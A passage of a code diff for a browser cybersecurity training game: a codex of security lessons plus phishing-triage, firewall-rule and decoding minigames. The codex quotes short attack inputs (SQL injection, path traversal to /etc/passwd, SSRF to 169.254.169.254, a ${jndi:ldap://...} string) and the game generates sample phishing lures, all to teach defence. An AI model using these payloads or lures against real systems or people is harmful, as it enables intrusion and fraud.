+  const draw=()=>{const f=$('#tfill'),n=$('#tnum');if(!f)return;const fr=t.left/t.tot;f.style.transform=`scaleX(${fr})`;f.classList.toggle('low',fr<.25);n.textContent=t.left.toFixed(1)+'s'};
+  t.iv=setInterval(()=>{const now=performance.now(),dt=Math.min(.25,(now-last)/1000);last=now;if(t.done)return;if(!t.paused&&!t.hold){t.left-=dt;const sec=Math.ceil(t.left);if(t.left/t.tot<.25&&sec!==t.lt){t.lt=sec;tone(1200,.03,'square',.025)}if(t.left<=0){t.left=0;t.done=true;clearInterval(t.iv);draw();onEnd();return}}draw()},50);
+  t.stop=()=>{t.done=true;clearInterval(t.iv)};t.frac=()=>Math.max(0,t.left/t.tot);
+  t.hit=s=>{t.left=Math.max(.05,t.left-s);const el=$('.timer');if(el){el.classList.remove('hit');void el.offsetWidth;el.classList.add('hit')}};
+  curTimer=t;draw();return t}
+function verdict(el,ok,html,next,auto){const go=once(next);
+  el.innerHTML=`<div class="verdict ${ok?'ok':'bad'}"><div><b>${ok?'Correct.':'Wrong.'}</b>${html}</div><button class="btn sm" id="vnext">Next<kbd>↵</kbd></button></div>`;
+  $('#vnext',el).onclick=go;try{el.scrollIntoView({block:'nearest',behavior:reduced?'auto':'smooth'})}catch(e){}buzz(ok?12:[30,40,30]);keyFn=e=>{if(e.key==='Enter'||e.key===' '){go();return true}};if(auto)later(go,auto)}
+const pips=d=>{const n=Math.max(1,Math.min(10,Math.round(d)));return '■'.repeat(n)+'<s>'+'■'.repeat(10-n)+'</s>'};
+
+/* ---------- codex ---------- */
+const CODEX={
+typosquat:['Typosquatting','Attackers register domains one typo away from the real one: swapped, doubled or lookalike characters. Read the sender domain letter by letter.','phish'],
+subdomain:['The subdomain trick','In bank.com.verify-login.net the registered domain is verify-login.net. Read right to left: the part just before the final .com/.net is who owns it.','phish'],
+linkmismatch:['Link mismatch','Link text can say anything. The real destination is the URL underneath, so check it before you click. Sender addresses can be forged too.','phish'],
+attachment:['Dangerous attachments','Double extensions like invoice.pdf.exe, plus .html, .iso and macro documents (.docm), are classic malware carriers.','phish'],
+bec:['Business email compromise','An executive name on an outside address, secrecy, urgency and gift cards or wire transfers. Verify through a channel you already trust.','phish'],
+iplink:['Raw IP links','Real services use named HTTPS domains. A login link to a bare IP address over http:// is a red flag.','phish'],
+legit:['Not everything is phishing','Reporting real mail has a cost too. Judge a message by its sender domain, link destination and attachments, not by its tone.','phish'],
+firstmatch:['First match wins','Firewalls read rules top to bottom and stop at the first match. Order matters: a broad rule placed above a specific one hides it.','fw'],
+cidr:['CIDR notation','10.66.0.0/16 fixes the first 16 bits: any 10.66.x.x address. /24 fixes three octets, /8 fixes one. 172.16.0.0/12 covers 172.16 through 172.31.','fw'],
+defaultdeny:['Default deny','A good ruleset ends by denying everything. Only traffic you explicitly allowed gets through.','fw'],
+ports:['Well-known ports','22 SSH · 23 Telnet · 25 SMTP · 53 DNS · 80 HTTP · 443 HTTPS · 445 SMB · 3306 MySQL · 3389 RDP.','fw'],
+base64:['Base64','Encoding, not encryption: anyone can reverse it. Spot it by the A-Z a-z 0-9 + / alphabet and = padding at the end.','dec'],
+hexenc:['Hex encoding','Each byte becomes two characters from 0-9 a-f. 66 6c 61 67 spells "flag".','dec'],
+caesar:['Caesar and ROT13','Shift ciphers move every letter a fixed distance. There are only 25 keys, so trying them all breaks it. Punctuation stays put, which gives it away.','dec'],
+binary:['Binary text','ASCII characters are 8-bit numbers. 01100001 is 97, the letter a.','dec'],
+layers:['Layered obfuscation','Malware and CTF flags often stack encodings. Peel from the outside in: name the outer layer by its alphabet, decode, repeat.','dec'],
+sqli:['SQL injection','Input like \' OR \'1\'=\'1 changes the meaning of a database query. Fix: parameterized queries, never string-built SQL.','logs'],
+xss:['Cross-site scripting','Injected <script> or onerror= runs in other visitors\' browsers and can steal sessions. Fix: encode output and set a Content Security Policy.','logs'],
+trav:['Path traversal','../ sequences climb out of the intended folder to read files like /etc/passwd. Fix: resolve the path and check it stays inside the allowed directory.','logs'],
+cmdi:['Command injection','A ; or | after expected input runs a second shell command. Fix: never pass user input to a shell; use argument arrays and allowlists.','logs'],
+recon:['Reconnaissance probes','Requests for /.env, /.git/config or backup files are scanners looking for leaked secrets. Never deploy those files to a web root.','logs'],
+brute:['Brute force','A burst of failed logins from one address, then a success, means a guessed password. Fix: rate limits, lockouts and MFA.','logs'],
+bits:['Place values','Each bit is worth double the one to its right: 128 64 32 16 8 4 2 1. Any number 0-255 is a sum of those.','bits'],
+hexnum:['Hex numbers','One hex digit is exactly four bits, so two digits make a byte. 0xAD is 1010 1101.','bits'],
+bitwise:['Bitwise operators','AND keeps bits set in both inputs, OR in either, XOR in exactly one. XOR undoes itself, which is why ciphers are built on it.','bits'],
+subnetmask:['Subnet masks','A /26 mask is 26 one-bits: 255.255.255.192. The last octet is 256 minus the block size (64).','bits'],
+sidechannel:['Side channels','A check that reveals which part of a secret was right, by message or even by response time, can be cracked piece by piece. Compare in constant time and answer only pass or fail.','lock'],
+lockout:['Attempt limits','Limiting guesses turns a brute force that takes seconds into one that takes centuries.','lock'],
+cia:['The CIA triad','Confidentiality (only the right people read it), Integrity (it has not been altered), Availability (it is there when needed). Every control protects at least one.','quiz'],
+replyto:['Reply-To mismatch','The From line can be forged to look right while replies quietly go to the attacker. Invoice and bank-detail fraud depends on it. Confirm payment changes by phone.','phish'],
+urlenc:['URL encoding','%66%6c%61%67 is "flag": each byte written as % plus two hex digits. Attackers use it to slip payloads past naive filters.','dec'],
+ssrf:['Server-side request forgery','A url= parameter pointed at 169.254.169.254 or an internal host makes the server fetch secrets for the attacker. Fix: allowlist destinations and block internal ranges.','logs'],
+jndi:['Log4Shell','${jndi:ldap://...} in any logged field made vulnerable Java servers download and run remote code. One of the worst bugs of its decade: patch your dependencies.','logs'],
+segment:['Containment','When malware is spreading, isolating hosts beats cleaning them. Segmented networks give you choke points; flat networks give you none.','quar'],
+graph:['Graphs and cuts','A network is a graph. Asking "can the infection still reach the database?" is a breadth-first search, and the smallest set of hosts that disconnects them is a minimum cut.','quar'],
+entropy:['Length beats complexity','Each extra random character multiplies the work for an attacker. Four random words or 12+ random characters beat a short password stuffed with symbols.','pw'],
+dictionary:['Dictionary attacks','Crackers try leaked passwords first, then dictionary words with the usual tweaks: capital first letter, a year, ! at the end, @ for a. P@ssw0rd! falls in seconds.','pw'],
+bsearch:['Binary search','Halving the suspects each step finds one item among a million in about 20 checks. It is why git bisect, sorted indexes and guessing games are fast: O(log n).','bis'],
+userinfo:['The @ trick in links','In a web address, anything before an @ is a username that the browser ignores. https://bank.com@evil.net goes to evil.net.','phish'],
+dispname:['Display-name spoofing','The name shown next to an email is free text that anyone can set. Only the address after the @ says where it came from.','phish'],
+ascii:['ASCII','Every character is stored as a number: A is 65, a is 97, 0 is 48. Hex, binary and decimal encodings are just different ways to write those numbers.','bits'],
+atbash:['Atbash','A substitution cipher that mirrors the alphabet: A becomes Z, B becomes Y. Like ROT13 it is its own inverse, and like every simple substitution it hides nothing from anyone who looks.','dec'],
+twos:["Two's complement",'How computers store negative integers: flip every bit and add one. In one byte, 11111111 is −1 and 10000000 is −128.','bits'],
+webshell:['Web shells','A script an attacker uploads to a server so they can run commands through ordinary web requests. Look for command parameters on files in upload folders.','logs'],
+enum:['Enumeration','Walking through IDs one by one to harvest every record. Sequential requests from a single source are the tell; access checks and rate limits are the fix.','logs'],
+infotheory:['Information and guessing','Every answer rules out possibilities. A guess that splits the remaining options evenly teaches the most, which is how thousands of codes shrink to one in a handful of tries.','lock'],
+knock:['Port knocking','A hidden service that only opens after connection attempts hit a secret sequence of ports. It cuts scanner noise, but it is obscurity: real access control still has to sit behind it.','knock'],
+};
+function learn(keys){const fresh=[];(keys||[]).forEach(k=>{if(CODEX[k]&&!S.codex[k]){S.codex[k]=1;fresh.push(k)}});if(fresh.length){persist();const n=Object.keys(S.codex).length;if(n>=15)award('book');if(n>=Object.keys(CODEX).length)award('lib')}return fresh}
+const entryHTML=(k,cls='')=>`<div class="entry ${cls}"><h3>${esc(CODEX[k][0])}</h3><p>${esc(CODEX[k][1])}</p></div>`;
+
+/* ---------- achievements & ranks ---------- */
+const ACH={first:['Hello, World','Secure your first node'],c5:['On a Roll','Reach a 5-node combo'],c10:['Flow State','Reach a 10-node combo'],boss:['Incident Closed','Contain a boss threat'],
+  win:['Contract Fulfilled','Clear all three sectors'],ghost:['Ghost','Finish a contract under 25% breach'],phish:['Phish Proof','Triage a full inbox with no mistakes'],onion:['Onion Peeler','Decode a flag with three or more layers'],
+  lucky:['Educated Guess','Open the Leaky Lock in three guesses or fewer'],s3:['Four Digits','Score 3,000 in one run'],s8:['High Roller','Score 8,000 in one run'],ot:['Overtime','Clear a sector beyond the contract'],
+  daily:['Daily Driver','Finish a daily run'],st3:['Habit','Play the daily three days in a row'],book:['Bookworm','Unlock 15 codex entries'],lib:['Librarian','Complete the codex'],poly:['Polyglot','Win every minigame at least once'],master:['Specialist','Earn three stars on any minigame'],clean:['Surgical','Contain two networks using the fewest possible quarantines'],logn:['Log N','Find two backdoors without wasting a single test'],knockp:['Open Sesame','Finish Port Knock without a wrong knock'],wise:['Sound Judgment','Make the right call three times in one run'],reflex:['Reflexes','Answer 25 questions in a single Blitz'],reflex2:['Overclocked','Answer 50 questions in a single Blitz']};
+function award(id){if(S.ach[id])return;S.ach[id]=1;persist();toast(`Achievement: <b>${ACH[id][0]}</b>`);sfx.win()}
+const RANKS=[[0,'Script Kiddie'],[300,'Help Desk'],[800,'SOC Analyst'],[1600,'Incident Responder'],[3000,'Threat Hunter'],[5000,'Pen Tester'],[8000,'Red Team Lead'],[12000,'Security Architect'],[18000,'CISO'],[26000,'Zero-Day Legend']];
+const rankOf=xp=>{let i=0;while(i+1<RANKS.length&&xp>=RANKS[i+1][0])i++;return i};
+
+/* =====================================================================
+   MINIGAMES   each: play(d, done)  ->  done({win,mistakes,perfect,frac,learn,note})
+   ===================================================================== */
+const G={};
+
+/* ---- 1. Phish Tank ---- */
+const ORGS=[{n:'Vantage Pay',d:'vantagepay.com'},{n:'Parcelly',d:'parcelly.com'},{n:'Nimbus Drive',d:'nimbusdrive.com'},{n:'Peakstream',d:'peakstream.tv'},{n:'Northwind Bank',d:'northwindbank.com'},{n:'Orbit Mail',d:'orbitmail.com'},{n:'Lumen Docs',d:'lumendocs.com'},{n:'Kestrel Air',d:'kestrelair.com'},{n:'Tallybooks',d:'tallybooks.io'}];
+const CORP='helixcorp.com';
+const SCEN=[
+ {s:o=>`Action required: verify your ${o.n} account`,b:()=>'We noticed unusual sign-in activity. Verify your account within 24 hours or it will be suspended.',l:'Verify account',p:'/verify'},
+ {s:o=>`Your ${o.n} receipt`,b:()=>'Thanks for your payment. Your receipt is ready in your account.',l:'View receipt',p:'/receipts'},
+ {s:()=>'Your password expires today',b:()=>'Your password expires at midnight. Confirm it now to keep access.',l:'Keep my password',p:'/password'},
+ {s:()=>'A file was shared with you',b:()=>'Jordan shared "Q4-budget.xlsx" with you.',l:'Open file',p:'/shared/q4-budget'},
+ {s:()=>'Delivery attempt failed',b:()=>'We could not deliver your parcel. Confirm your address to reschedule.',l:'Reschedule delivery',p:'/track'},
+ {s:()=>'New sign-in to your account',b:()=>'A new device signed in. If this was you, no action is needed.',l:'Review activity',p:'/security'},
+ {s:()=>'Your monthly statement is ready',b:()=>'Your statement for last month is now available.',l:'View statement',p:'/statements'},
+ {s:o=>`Your ${o.n} subscription renews tomorrow`,b:()=>'Your plan renews automatically. Manage your subscription if you want to make changes.',l:'Manage subscription',p:'/billing'},
+ {s:()=>'Security alert: your password was changed',b:()=>'Your password was changed a few minutes ago. If this was not you, secure your account now.',l:'Secure my account',p:'/recover'},
+ {s:()=>'You have 1 new voicemail',b:()=>'A caller left you a 42-second message.',l:'Listen now',p:'/voicemail'},
+ {s:()=>'Please sign: updated terms',b:()=>'A document is waiting for your signature.',l:'Review document',p:'/sign'}];
+function typo(dom){const k=dom.indexOf('.'),n=dom.slice(0,k),t=dom.slice(k),out=[],sub={o:'0',l:'1',i:'l',m:'rn',a:'e',e:'a'};
+  for(let i=1;i<n.length-1;i++){if(n[i]!==n[i+1])out.push(n.slice(0,i)+n[i+1]+n[i]+n.slice(i+2));out.push(n.slice(0,i)+n[i]+n.slice(i));if(sub[n[i]])out.push(n.slice(0,i)+sub[n[i]]+n.slice(i+1))}
+  return pick(out.filter(x=>x!==n))+t}
+function mkEmail(d,forcePhish){const o=pick(ORGS),sc=pick(SCEN);
+  const e={fromName:o.n,fromAddr:`no-reply@${o.d}`,subject:sc.s(o),body:sc.b(o),linkText:sc.l,linkUrl:`https://${o.d}${sc.p}`,attach:null,phish:false,k:'legit',
+    why:`Sender and link both use the real domain ${o.d}. Urgent wording alone does not make a message phishing.`};
+  if(!forcePhish){const r=rnd();
+    if(r<.3){Object.assign(e,{fromName:'Helix IT Helpdesk',fromAddr:`helpdesk@${CORP}`,subject:'Scheduled maintenance Saturday 02:00',body:'The VPN will be unavailable for about 30 minutes. No action is needed.',linkText:'Status page',linkUrl:`https://status.${CORP}/`,
+      why:`status.${CORP} is a genuine subdomain: the registered domain is still ${CORP}.`})}
+    else if(r<.5&&d>=3){e.attach='Statement_October.pdf';e.why=`A plain .pdf from the correct domain ${o.d}, with a link to the same domain, is normal.`}
+    else if(r<.7&&d>=4){e.fromAddr=`billing@mail.${o.d}`;e.linkUrl=`https://account.${o.d}${sc.p}`;e.why=`mail.${o.d} and account.${o.d} are subdomains of the real domain ${o.d}. What matters is the part just before the ending.`}
+    return e}
+  const kinds=d<3?['typo','attach','ip','bec']:d<5?['typo','sub','link','attach','bec','ip','sub','link','reply','tld','disp']:['typo','sub','link','attach','bec','ip','sub','link','reply','tld','disp','at','at'];
+  const k=pick(kinds);e.phish=true;
+  if(k==='typo'){e.ev=['from','link'];const td=typo(o.d);e.fromAddr=`security@${td}`;e.linkUrl=`https://${td}${sc.p}`;e.k='typosquat';e.why=`The domain is ${td}, not ${o.d}. Lookalike domains swap, double or replace letters.`}
+  else if(k==='sub'){e.ev=['from','link'];const bad=`${o.d}.${pick(['account-verify.net','secure-login.co','id-check.info'])}`;e.fromAddr=`no-reply@${bad}`;e.linkUrl=`https://${bad}/login`;e.k='subdomain';e.why=`Read the domain right to left: it belongs to ${bad.split('.').slice(-2).join('.')}. "${o.d}" is only a subdomain label in front.`}
+  else if(k==='link'){e.ev=['link'];const bad=pick(['secure-portal-login.net','acct-check.co','id-confirm.info']);e.linkText=`https://${o.d}${sc.p}`;e.linkUrl=`https://${bad}/${o.d.split('.')[0]}`;e.k='linkmismatch';e.why=`The link text shows ${o.d} but it really goes to ${bad}. The From address was forged.`}
+  else if(k==='attach'){e.ev=['att'];e.subject='Invoice attached - payment overdue';e.body='Please see the attached invoice. You may need to enable content to view it.';e.linkText=null;e.attach=pick(['Invoice_8841.pdf.exe','Invoice_8841.html','Scan_0092.iso','Payment_Details.docm']);e.k='attachment';e.why=`${e.attach} is not a document you can trust: executables, HTML pages, disk images and macro files are how malware arrives.`}
+  else if(k==='bec'){e.ev=['from','body'];Object.assign(e,{fromName:'Dana Reyes (CEO)',fromAddr:`dana.reyes.ceo@${pick(['gmail-mail.com','outlook-office.net','proton-mail.co'])}`,subject:'Quick favor - are you at your desk?',body:'I am in a meeting and cannot talk. I need you to buy 5 gift cards for a client right now and send me the codes. Keep this between us.',linkText:null,k:'bec',why:`The CEO's name on an outside address, plus secrecy, urgency and gift cards. Your company's domain is ${CORP}.`})}
+  else if(k==='reply'){e.ev=['reply'];e.replyTo=`accounts@${pick(['payments-desk.net','billing-update.co','invoice-team.info'])}`;e.subject='Updated bank details for your next invoice';e.body='Our bank details have changed. Reply to this email to confirm and we will send the new account number.';e.linkText=null;e.k='replyto';e.why=`The From address looks right, but replies go to ${e.replyTo.split('@')[1]}. That is how invoice fraud works.`}
+  else if(k==='tld'){e.ev=['from','link'];const td=o.d.slice(0,o.d.indexOf('.'))+pick(['.co','.net','.org','.info','.support'].filter(x=>!o.d.endsWith(x)));e.fromAddr=`no-reply@${td}`;e.linkUrl=`https://${td}${sc.p}`;e.k='typosquat';e.why=`Right name, wrong ending: the real domain is ${o.d}, this is ${td}. Anyone can register the same name under a different ending.`}
+  else if(k==='at'){e.ev=['link'];const bad=pick(['login-portal.net','acct-check.co','id-confirm.info']);e.linkUrl=`https://${o.d}@${bad}${sc.p}`;e.k='userinfo';e.why=`Everything before the @ in a link is a username, not the site. This link goes to ${bad}; "${o.d}" in front is decoration. The From address was forged.`}
+  else if(k==='disp'){e.ev=['from','body'];const bad=pick(['mailbox-free.net','quickmail.co','post-inbox.info']);Object.assign(e,{fromName:`${o.n} Security Team`,fromAddr:`${o.d.split('.')[0]}.security@${bad}`,subject:`Your ${o.n} account is on hold`,body:'We could not verify your identity. Reply to this email with your full name, date of birth and account number to restore access.',linkText:null,k:'dispname',why:`The display name says ${o.n}, but the address is at ${bad}. Anyone can type any name, and real companies do not ask for personal details by reply.`})}
+  else{e.ev=['link'];const ip=`${ri(45,220)}.${ri(1,254)}.${ri(1,254)}.${ri(1,254)}`;e.fromAddr=`alerts@${o.d}`;e.linkUrl=`http://${ip}/login`;e.k='iplink';e.why=`The link goes to a bare IP address (${ip}) over unencrypted http. The From address was forged.`}
+  return e}
+G.phish={name:'Phish Tank',tag:'Email triage',glyph:'@',how:'Read each email. Check the sender\'s domain and where the link really goes. To report one, click the part that gives it away: naming the right clue every time is what makes a clear flawless. One wrong call is allowed.',keys:'Click the giveaway to report it · L or → legit · P reports without naming a clue',
+play(d,done){const n=Math.min(7,4+Math.floor(d/3));let emails=[];for(let i=0;i<n;i++)emails.push(mkEmail(d,i<Math.ceil(n*.55)));emails=shuffle(emails);
+  let i=0,miss=0,sloppy=0,busy=false;const seen=new Set();const body=frame(this);
+  const t=startTimer(n*Math.max(7.5,12.5-d*.5),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();done({win:ok&&miss<=1,mistakes:miss,perfect:miss===0&&sloppy===0&&ok,frac:t.frac(),learn:[...seen],note:note||(miss>1?'Too many mistakes':sloppy?`Right calls, but ${sloppy} clue${sloppy>1?'s were':' was'} misnamed`:''),game:'phish'})});
+  function render(){busy=false;const e=emails[i];dbg(e);$('#gprog').textContent=`Email ${i+1} / ${n}`;
+    body.innerHTML=`<div class="mail"><div class="mrow fl" data-part="from"><span class="lab">From</span><b>${esc(e.fromName)}</b><code>&lt;${esc(e.fromAddr)}&gt;</code></div>${e.replyTo?`<div class="mrow fl" data-part="reply"><span class="lab">Reply-To</span><code>&lt;${esc(e.replyTo)}&gt;</code></div>`:''}<div class="mrow fl" data-part="body"><span class="lab">Subject</span><span>${esc(e.subject)}</span></div>
+      <div class="mbody"><p class="fl" data-part="body">${esc(e.body)}</p>${e.linkText?`<div class="fl lk" data-part="link"><span class="fakelink">${esc(e.linkText)}</span><div class="href">link really goes to → <code>${esc(e.linkUrl)}</code></div></div>`:''}${e.attach?`<span class="attach fl" data-part="att">Attachment: ${esc(e.attach)}</span>`:''}</div></div>
+      <div class="actions"><button class="btn danger" id="bP">Report phish<kbd>P</kbd></button><button class="btn ok" id="bL">Looks legit<kbd>L</kbd></button></div><div id="fb"></div><p class="hint">${TOUCH?'Tap':'Click'} the suspicious part of the email itself to report it with evidence.</p>`;
+    $('#bP').onclick=()=>ans(true);$('#bL').onclick=()=>ans(false);$$('.fl').forEach(x=>x.onclick=()=>ans(true,x.dataset.part));
+    keyFn=ev=>{const k=ev.key.toLowerCase();if(k==='p'||k==='arrowleft'){ans(true);return true}if(k==='l'||k==='arrowright'){ans(false);return true}}}
+  function ans(isPhish,part){if(busy)return;busy=true;const e=emails[i],ok=isPhish===e.phish;seen.add(e.k);t.paused=true;ok?sfx.ok():(sfx.bad(),miss++);
+    $$('.actions .btn').forEach(b=>b.disabled=true);let pre='',slow=!ok;
+    if(e.phish){$$('.fl').forEach(x=>{if(e.ev.includes(x.dataset.part))x.classList.add('hit')});if(ok&&part){if(e.ev.includes(part))pre=' Sharp eye.';else{sloppy++;slow=true;pre=' Right call, wrong clue: the real giveaway is outlined.'}}}
+    else if(part)$$('.fl').forEach(x=>{if(x.dataset.part===part)x.classList.add('miss')});
+    verdict($('#fb'),ok,`${pre} This one is ${e.phish?'phishing':'legitimate'}. ${esc(e.why)}`,()=>{t.paused=false;i++;if(miss>1)return end(false);if(i>=n)return end(true);render()},slow?0:1700)}
+  render()}};
+
+/* ---- 2. Packet Gate ---- */
+const SV=[{p:22,t:'tcp',n:'SSH'},{p:80,t:'tcp',n:'HTTP'},{p:443,t:'tcp',n:'HTTPS'},{p:53,t:'udp',n:'DNS'},{p:3389,t:'tcp',n:'RDP'},{p:25,t:'tcp',n:'SMTP'},{p:3306,t:'tcp',n:'MySQL'},{p:23,t:'tcp',n:'Telnet'},{p:445,t:'tcp',n:'SMB'},{p:123,t:'udp',n:'NTP'},{p:21,t:'tcp',n:'FTP'},{p:5432,t:'tcp',n:'PSQL'},{p:161,t:'udp',n:'SNMP'},{p:389,t:'tcp',n:'LDAP'}];
+const svName=p=>(SV.find(s=>s.p===p)||{n:''}).n;
+const NETS=['10.0.0.0/8','10.66.0.0/16','192.168.1.0/24','172.16.0.0/12','203.0.113.0/24','198.51.100.0/24'];
+const ip2i=s=>s.split('.').reduce((a,b)=>a*256+ +b,0),i2ip=n=>[Math.floor(n/16777216)%256,Math.floor(n/65536)%256,Math.floor(n/256)%256,n%256].join('.');
+function inCidr(ip,c){const[b,m]=c.split('/'),sz=2**(32-+m);return Math.floor(ip2i(ip)/sz)===Math.floor(ip2i(b)/sz)}
+function ipIn(c){const[b,m]=c.split('/'),sz=2**(32-+m);return i2ip(Math.floor(ip2i(b)/sz)*sz+ri(1,sz-2))}
+const randIp=()=>rnd()<.5?ipIn(pick(NETS)):`${pick([8,34,52,91,145,185])}.${ri(0,255)}.${ri(0,255)}.${ri(1,254)}`;
+function genRules(d){const rules=[],nets=d<3?['192.168.1.0/24','203.0.113.0/24','10.0.0.0/8']:NETS;
+  if(d>=2)rules.push({act:'DENY',proto:'any',port:null,cidr:pick(d<4?['203.0.113.0/24']:['203.0.113.0/24','10.66.0.0/16','198.51.100.0/24'])});
+  shuffle(SV).slice(0,Math.min(5,2+Math.floor(d/2))).forEach(s=>rules.push({act:rnd()<.75?'ALLOW':'DENY',proto:s.t,port:s.p,cidr:rnd()<.5?null:pick(nets)}));
+  if(!rules.some(r=>r.act==='ALLOW'))rules[rules.length-1].act='ALLOW';return rules}
+function fwEval(rules,k){for(let i=0;i<rules.length;i++){const r=rules[i];if((r.proto==='any'||r.proto===k.proto)&&(r.port==null||r.port===k.port)&&(!r.cidr||inCidr(k.ip,r.cidr)))return{act:r.act,i}}return{act:'DENY',i:rules.length}}
+G.fw={name:'Packet Gate',tag:'Firewall rules',glyph:'#',how:'Rules are checked top to bottom and the first match wins. If nothing matches, the packet is denied. Decide each packet. From difficulty 4, allow or deny is not enough: you pick the exact rule that decides it. Two mistakes are allowed.',keys:'A or ← allow · D or → deny · at higher difficulty, keys 1-9 pick the rule',
+play(d,done){const rules=genRules(d),pm=d>=4,n=pm?Math.min(10,5+Math.floor(d/2)):Math.min(14,7+Math.floor(d));let i=0,miss=0,busy=false,pkt;
+  const gen=()=>{let proto,port,ip;if(rnd()<.7){const r=pick(rules);proto=r.proto==='any'?pick(['tcp','udp']):r.proto;port=r.port||pick(SV).p;ip=r.cidr?(rnd()<.75?ipIn(r.cidr):randIp()):randIp();if(rnd()<.12)proto=proto==='tcp'?'udp':'tcp'}else{const s=pick(SV);proto=s.t;port=s.p;ip=randIp()}return{proto,port,ip}};
+  const next=()=>{const want=rnd()<.5?'ALLOW':'DENY';for(let k=0;k<25;k++){pkt=gen();if(fwEval(rules,pkt).act===want)break}};
+  const body=frame(this);
+  body.innerHTML=`<ol class="rules ${pm?'pick':''}">${rules.map((r,j)=>`<li data-i="${j}"><span class="n">#${j+1}</span><b class="${r.act}">${r.act}</b><span>${r.proto==='any'?'any port':`${r.proto}/${r.port} <span class="n">${svName(r.port)}</span>`}</span><span>from ${r.cidr||'anywhere'}</span></li>`).join('')}<li data-i="${rules.length}"><span class="n">#${rules.length+1}</span><b class="DENY">DENY</b><span>everything else</span><span class="n">default</span></li></ol>
+    <div id="pk"></div>${pm?`<p class="keys" style="color:var(--text)">Which rule decides this packet? ${TOUCH?'Tap':'Click'} it above.</p>`:'<div class="actions"><button class="btn ok" id="bA">Allow<kbd>A</kbd></button><button class="btn danger" id="bD">Deny<kbd>D</kbd></button></div>'}<div id="fb"></div>
+    <p class="hint">/24 = first three numbers must match · /16 = first two · /8 = first one · 172.16.0.0/12 = 172.16 to 172.31</p>`;
+  const t=startTimer(n*(pm?Math.max(5,9-d*.4):Math.max(3.2,6.5-d*.3)),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();done({win:ok&&miss<=2,mistakes:miss,perfect:ok&&miss===0,frac:t.frac(),learn:['firstmatch','defaultdeny','ports'].concat(rules.some(r=>r.cidr)?['cidr']:[]),note:note||(miss>2?'Too many wrong calls':''),game:'fw'})});
+  const whyNot=r=>r.proto!=='any'&&(r.proto!==pkt.proto||r.port!==pkt.port)?`it covers ${r.proto}/${r.port}, and this packet is ${pkt.proto}/${pkt.port}`:`${pkt.ip} is not inside ${r.cidr}`;
+  function render(){busy=false;next();dbg({rules,pkt,pm});$('#gprog').textContent=`Packet ${i+1} / ${n}`;$$('.rules li').forEach(l=>l.className='');$('#fb').innerHTML='';
+    $('#pk').innerHTML=`<div class="pkt"><div><label>Source</label><b>${pkt.ip}</b></div><div><label>Protocol</label><b>${pkt.proto.toUpperCase()}</b></div><div><label>Dest port</label><b>${pkt.port} <small>${svName(pkt.port)}</small></b></div></div>`;
+    keyFn=e=>{const k=e.key.toLowerCase();if(pm){const j=+k-1;if(j>=0&&j<=rules.length){ans(j);return true}return}if(k==='a'||k==='arrowleft'){ans('ALLOW');return true}if(k==='d'||k==='arrowright'){ans('DENY');return true}}}
+  function ans(a){if(busy)return;busy=true;const r=fwEval(rules,pkt),ok=pm?a===r.i:a===r.act;$(`.rules li[data-i="${r.i}"]`).classList.add(ok||pm?'hitok':'hitbad');if(pm&&!ok)$(`.rules li[data-i="${a}"]`).classList.add('hitbad');
+    const go=()=>{t.paused=false;i++;if(miss>2)return end(false);if(i>=n)return end(true);render()};
+    if(ok){sfx.ok();later(go,pm?420:260)}else{sfx.bad();miss++;t.paused=true;
+      verdict($('#fb'),false,!pm?` Rule #${r.i+1} is the first match, so this packet is ${r.act==='ALLOW'?'allowed':'denied'}.`:a<r.i?` Rule #${a+1} does not match: ${whyNot(rules[a])}. Rule #${r.i+1} is the first that does, so the packet is ${r.act==='ALLOW'?'allowed':'denied'}.`:` Rule #${r.i+1} matches first, so the packet never reaches rule #${a+1}.`,go)}}
+  if(pm)$$('.rules li').forEach(l=>l.onclick=()=>ans(+l.dataset.i));else{$('#bA').onclick=()=>ans('ALLOW');$('#bD').onclick=()=>ans('DENY')}render()}};
+
+/* ---- 3. Onion Decoder ---- */
+const caesar=(s,n)=>s.replace(/[a-z]/gi,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+n+26)%26+b)});
+const printable=s=>/^[\x20-\x7e]+$/.test(s);
+const atbash=s=>s.replace(/[a-z]/gi,c=>{const b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b))});
+const ENC={dec:s=>[...s].map(c=>c.charCodeAt(0)).join(' '),atb:s=>atbash(s),b64:s=>btoa(s),hex:s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(''),rot13:s=>caesar(s,13),rev:s=>[...s].reverse().join(''),bin:s=>[...s].map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '),url:s=>[...s].map(c=>'%'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('')};
+const DEC={
+  b64:s=>{if(!/^[A-Za-z0-9+/]+={0,2}$/.test(s)||s.length%4)return null;try{const o=atob(s);return printable(o)?o:null}catch(e){return null}},
+  dec:s=>{const p=s.trim().split(' ');if(p.length<2||!p.every(x=>/^\d{2,3}$/.test(x)&&+x>=32&&+x<=126))return null;return p.map(x=>String.fromCharCode(+x)).join('')},atb:s=>atbash(s),
+  hex:s=>{const x=s;if(!/^[0-9a-fA-F]+$/.test(x)||x.length%2)return null;let o='';for(let i=0;i<x.length;i+=2)o+=String.fromCharCode(parseInt(x.substr(i,2),16));return printable(o)?o:null},
+  bin:s=>{const p=s.trim().split(/\s+/);if(!p.every(x=>/^[01]{8}$/.test(x)))return null;const o=p.map(x=>String.fromCharCode(parseInt(x,2))).join('');return printable(o)?o:null},
+  url:s=>{if(!/^(%[0-9a-fA-F]{2})+$/.test(s))return null;const o=s.replace(/%(..)/g,(m,h)=>String.fromCharCode(parseInt(h,16)));return printable(o)?o:null},
+  rot13:s=>caesar(s,13),rev:s=>[...s].reverse().join(''),cm:s=>caesar(s,-1),cp:s=>caesar(s,1)};
+const WORDS=['zero_trust','salt_hash','patch_now','mfa_on','no_reuse','log_it_all','sandbox','least_priv','backups','rotate_keys','deny_all','verify','trust_no_input','defense_in_depth','hash_and_salt','lock_screen','update_often','think_first','read_the_logs','segment_it'];
+function genDec(d){const plain=`flag{${pick(d<=2?['mfa_on','sandbox','backups','verify']:WORDS)}}`;let s=plain;const layers=[];const ap=k=>{s=ENC[k](s);layers.push(k)};
+  if(d<=2)ap(pick(['b64','hex','rot13','rev','bin','dec']));
+  else{const inner=d<=4?pick(['rot13','rev','atb']):pick(['rot13','rev','atb','caesar','caesar']);
